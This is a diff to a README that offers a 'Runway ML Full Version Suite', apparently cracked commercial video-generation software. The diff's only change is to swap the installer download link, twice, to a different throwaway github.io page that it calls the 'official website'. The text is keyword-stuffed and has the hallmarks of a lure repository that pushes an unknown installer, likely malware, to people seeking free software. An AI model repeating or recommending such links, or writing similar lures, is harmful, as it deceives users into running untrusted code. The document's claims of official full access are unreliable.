@@ -2,7 +2,7 @@
 
 This repository provides the Runway ML Full Version Suite, a comprehensive package for AI video generation. It is designed to give users complete access to all Runway ML tools and models, enabling professional-quality video creation with ease. The primary keyword for this suite is "runway ml full version", ensuring you find the right resources.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## Features
 
@@ -47,4 +47,4 @@ A5: This repository provides access to Runway ML's full features for educational
 
 To get the Runway ML Full Version Suite, use the link below. This will take you to the official download page where you can obtain the installer file.
 
-[Download from official website](https://yellowtaxisave.github.io/download-page/)
+[Download from official website](https://capitals-707-bringing.github.io/download-page/)
